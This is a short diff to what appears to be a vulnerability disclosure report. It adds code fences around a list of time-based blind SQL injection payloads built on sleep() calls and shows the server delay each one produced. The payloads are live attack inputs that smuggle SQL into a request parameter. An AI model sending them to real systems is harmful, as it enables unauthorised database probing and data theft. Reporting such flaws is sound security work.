@@ -30,10 +30,13 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 ```
 Which resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).
 Using various values for the sleep function you get various time responses.
+```
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
 0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337
+```
+
 I have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.
 
